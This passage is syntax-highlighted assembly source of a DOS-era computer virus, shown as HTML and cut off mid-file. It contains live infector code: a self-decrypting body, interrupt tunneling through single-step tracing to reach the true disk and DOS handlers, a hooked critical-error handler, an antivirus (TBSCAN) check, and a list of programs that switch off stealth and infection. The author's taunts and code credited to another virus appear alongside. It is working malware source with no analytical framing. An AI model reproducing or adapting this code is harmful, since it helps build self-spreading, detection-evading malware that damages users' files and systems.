        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Trace_Mode</span><span class="sc0">          </span><span class="sc1">; Get address from vector.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt</span><span class="sc0">

        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; TF on.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">Trace_Mode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Bios</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Mode_Dos</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Reset disk.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Tracer</span><span class="sc0">
</span><span class="sc5">Mode_Dos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">               </span><span class="sc1">; Get DOS-version (OEM).</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

</span><span class="sc5">Exit_Tracer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; TF off (just in case).</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Restore INT 01h.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int01h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int01h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;       I should be learning 4 my exams right now...</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'If I don''t pass... fuck it!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SKLSUX!'</span><span class="sc0">

</span><span class="sc5">NewInt01h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Segment.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">Trace_Mode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Bios</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Trace_Dos</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                </span><span class="sc1">; In BIOS-segment?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Not_In_Bios</span><span class="sc0">             </span><span class="sc1">; Continue when not.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Diss_Flag</span><span class="sc0">

</span><span class="sc5">Trace_Dos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Dos_Segment</span><span class="sc0">         </span><span class="sc1">; In DOS-segment?</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Not_In_Bios</span><span class="sc0">             </span><span class="sc1">; Continue when not.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">Diss_Flag</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; Diss trapflag on stack.</span><span class="sc0">

</span><span class="sc5">Not_In_Bios</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">

        </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc1">; Taken from Predator virus.</span><span class="sc0">
</span><span class="sc5">Push_All</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Ret_Add</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Pop return address to var.</span><span class="sc0">

        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Ret_Add</span><span class="sc0">              </span><span class="sc1">; Push return address on </span><span class="sc0">
                        </span><span class="sc1">; the stack.</span><span class="sc0">

</span><span class="sc5">Pop_All</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Ret_Add</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Save return address.</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Ret_Add</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">; Gets the SFT-address. *UNDOCUMENTED*</span><span class="sc0">
</span><span class="sc1">; BX = Handle.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Get_DCB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1220h</span><span class="sc0">               </span><span class="sc1">; Get DCB-number.</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1216h</span><span class="sc0">               </span><span class="sc1">; Get DCB-address.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">TBSCAN</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'TBSCAN.'</span><span class="sc0">



</span><span class="sc1">; During execution of one of these programs, the virus will be inactive,</span><span class="sc0">
</span><span class="sc1">; (no stealth, no infect).</span><span class="sc0">

</span><span class="sc5">No_Active</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'PKZIP.E'</span><span class="sc0">               </span><span class="sc1">; PKZIP.EXE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'ARJ.EXE'</span><span class="sc0">               </span><span class="sc1">; ARJ.EXE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'LHA.EXE'</span><span class="sc0">               </span><span class="sc1">; LHA.EXE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'RAR.EXE'</span><span class="sc0">               </span><span class="sc1">; RAR.EXE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CHKDSK.'</span><span class="sc0">               </span><span class="sc1">; CHKDSK.EXE</span><span class="sc0">
</span><span class="sc5">End_No_Active</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Hook_i24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">                 </span><span class="sc1">; Get INT 24h.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt</span><span class="sc0">
 
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int24h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">                 </span><span class="sc1">; Hook INT 24h.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NewInt24h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

        </span><span class="sc1">; I would really recommend getting this CD </span><span class="sc0">
        </span><span class="sc1">; (yes, it's da theme-music from Carmageddon).</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'[ DEMANUFACTURE - FEAR FACTORY ]'</span><span class="sc0">

</span><span class="sc5">Unhook_i24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">                 </span><span class="sc1">; Restore INT 24h.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int24h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">; Dummy Critical Error handler.</span><span class="sc0">
</span><span class="sc5">NewInt24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc1">;=======================================================================</span><span class="sc0">
</span><span class="sc1">; Search a table &amp; (re)set zeroflag depending on result. ZF when found.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DS:SI = Line</span><span class="sc0">
</span><span class="sc1">; CS:DI = Table</span><span class="sc0">
</span><span class="sc1">;    CX = Number of names to compare.</span><span class="sc0">
</span><span class="sc1">;=======================================================================</span><span class="sc0">
</span><span class="sc5">Search_Table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
        </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">STD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
        </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">


</span><span class="sc5">Find_Match</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Not_Found</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Not_Found</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Not_Found</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Not_Found</span><span class="sc0">


</span><span class="sc5">Comple</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Sea</span><span class="sc0">

</span><span class="sc5">Not_Found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Find_Match</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

</span><span class="sc5">Exit_Sea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">; Is the handle in BX corresponding to a file or a device? (sets ZF).</span><span class="sc0">
</span><span class="sc5">Check_Handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4400h</span><span class="sc0">               </span><span class="sc1">; IOCTL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Filehandle?</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Port_Driver</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'C:\WINDOWS\SYSTEM\IOSUBSYS\HDFLOP.PDR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Parameters</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">' NM CO'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">


</span><span class="sc5">End_Encrypted_File</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">NOP_Msg</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'$'</span><span class="sc0">

            </span><span class="sc1">; === VIRUS ENTRYPOINT ===</span><span class="sc0">
</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Save registers.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; (Same as Push_All).</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">

        </span><span class="sc1">;IN      AL, 21h                 ; Take-out keyboard.</span><span class="sc0">
        </span><span class="sc1">;OR      AL, 02h</span><span class="sc0">
        </span><span class="sc1">;OUT     21h, AL</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">End_Encrypted_File</span><span class="sc0">

</span><span class="sc5">Decrypt_Byte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Decrypt our body.</span><span class="sc0">
